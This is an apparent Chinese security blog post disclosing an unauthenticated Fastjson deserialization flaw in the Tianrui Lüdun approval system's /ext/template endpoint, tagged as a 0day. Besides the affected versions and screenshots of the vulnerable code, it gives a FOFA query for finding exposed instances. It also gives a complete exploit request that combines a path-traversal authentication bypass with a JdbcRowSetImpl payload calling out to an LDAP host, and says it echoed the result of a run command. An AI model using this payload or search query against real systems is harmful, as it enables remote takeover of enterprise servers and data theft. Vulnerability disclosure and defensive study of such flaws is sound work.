---
title: "天锐绿盾审批系统 /ext/template fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-template-rce.html
asset_dir: assets/天锐绿盾审批系统-exttemplate-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/template fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/29 08:20
- 355浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

ext

加密

计算机安全

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

Linux 与 Unix

该系统的 `/ext/template` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的[反序列化](https://mrxn.net/tag/rce)缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 漏洞扫描服务

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-001-dccf215f282d.webp)](https://image.mrxn.net/ed147fe831ab47369e842b7ef295446a.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

Windows安全工具

JSON处理工具

传输层安全性协议

再看`/ext/template` 的实现部分

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-002-a5040b1544ee.webp)](https://image.mrxn.net/3ff90774102a49f8acb65a574433e40f.webp)

请求body被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson[反序列化](https://mrxn.net/tag/rce)漏洞没啥好分析的。

计算机安全

`/ext/template/{templateId}` 亦如此

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-003-e65af5e8a792.webp)](https://image.mrxn.net/100c19f6cdf248dfbe4856e57f696241.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-004-fbee303a3771.webp)](https://image.mrxn.net/6effd7bdb52a4f1a8dc9fefa3d56b841.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/template HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-005-f3a27069c470.webp)](https://image.mrxn.net/e8659fa83a624e9e9d088ede97ca856f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
